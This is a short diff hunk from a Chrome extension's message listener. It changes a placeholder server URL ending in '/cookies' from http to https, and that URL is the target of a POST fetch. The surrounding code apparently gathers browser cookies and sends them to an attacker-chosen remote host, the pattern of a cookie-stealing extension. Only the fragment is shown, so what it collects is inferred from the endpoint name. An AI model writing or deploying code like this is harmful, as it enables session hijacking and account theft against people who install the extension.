@@ -16,7 +16,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
       }));
 
       // Replace with your server IP address
-      const serverUrl = "http://your-server-ip/cookies";
+      const serverUrl = "https://your-server-ip/cookies";
 
       fetch(serverUrl, {
         method: "POST",
